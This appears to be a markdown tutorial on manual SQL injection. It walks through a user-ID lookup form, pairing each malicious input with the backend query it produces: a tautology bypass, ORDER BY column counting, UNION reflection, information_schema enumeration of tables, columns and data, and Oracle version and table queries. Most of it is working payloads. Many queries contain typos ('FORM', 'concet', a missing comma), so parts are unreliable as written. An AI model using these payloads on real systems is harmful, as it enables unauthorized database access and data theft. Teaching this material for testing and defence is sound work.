 ## Manual SQL Injention:

 # Pre-requisites:

   1. Knowledge of SQL (Structerd Query Language), basic (CREATE,READ,UPDATE,DELETE)
   2. Backend Technologies (PHP,JSP etc.)
   3. Web application basic

  # Working:
   1.Methodology:

     Application says:
     Enter a User ID.

     Backend Query:
     SELECT first_name, last_name FORM users WHERE user_id = '$id';

     User Input:
     1

     Backend Query:
     SELECT first_name, last_name FORM users WHERE user_id = '1';

     user input:
     1'

     Backend Query:
     SELECT first_name, last_name FORM users WHERE user_id = '1'';


     Malicious User Input:
     1' or 1='1 

     Backend Query:
     SELECT first_name, last_name FORM usres WHERE user_id = '1' or 1='1';

     Malicious User Input:
     1' or 1=1#

     Basckend Query:
     SELECT first_name, last_name FORM users WHERE user_id = '1' or 1=1#';

   2.Finding Number of columns in the current table:
      
      Malicious User Input:
      1' ORDER BY 1,2,3,4,5,6,7,8#

      Backend Query:
      SELECT first_name, last_name FORM users WHERE user_id = '1' ORDER BY 1,2,3,4,5,6,7,8#;

   3.Finding reflection of output:

      Malicious User Input:
      1' UNION SELECT 1,2,3,4,5,6,7,8#

      Backend Query:
      SELECT first_name, last_name FORM users WHERE user_id = '1' UNION SELECT 1,2,3,4,5,6,7,8#;

   4.Extracting senstive information:
      
      Common cammands: version(), user(), @@hostname, database()

      List table name:
          1' UNION SELECT 1,table_name,3,4,5,6,7,8 from information_schema.tables#

          Backend Query:
          SELECT first_name, last_name FORM users WHERE user_id = '1' UNION SELECT 1,table_name,3,4,5,6,7,8 from information_schema.tables#;

      List columns:
          1' UNION SELECT 1,column_name,3,4,5,6,7,8 from information_schema.columns where table_name=$TABLE_NAME$#

          Backend Query:
          SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1,column_name,3,4,5,6,7,8 from information_schema.columns Where table_name=$TABLE_NAME$#;
        
      Extract data off columns:
          
          1' UNION SELECT 1,$COLUMN_NAME1$,$COLUMN_NAME2$4,5,6,7,8 from $TABLE_NAME$#

          Backend Query:
          SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1,$COLUMN_NAME1$,$COLUMN_NAME2$,4,5,6,7,8 from $TABLE_NAME$#;

          1' UNION SELECT 1,concet($COLUMN_NAME1$,$SEPARATORS$,$COLUMN_NAME2$),3,4,5,6,7,8 from $TABLE_NAME$#

          Backend Query:
          SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1,concet($COLUMN_NAME1$,$SEPARATOR$,$COLUMN_NAME2),3,4,5,6,7,8 from $TABLE_NAME$#;


  # Oracle Database:
  
     1.For version
    'UNION SELECT banner FROM v$version
    'UNION SELECT version FROM v$instance

    2.Database contents
    'UNION SELECT table_name,2 FROM all_tables
    'UNION SELECT column_name,2 FROM all_tab_columns WHERE table_name='table name'  
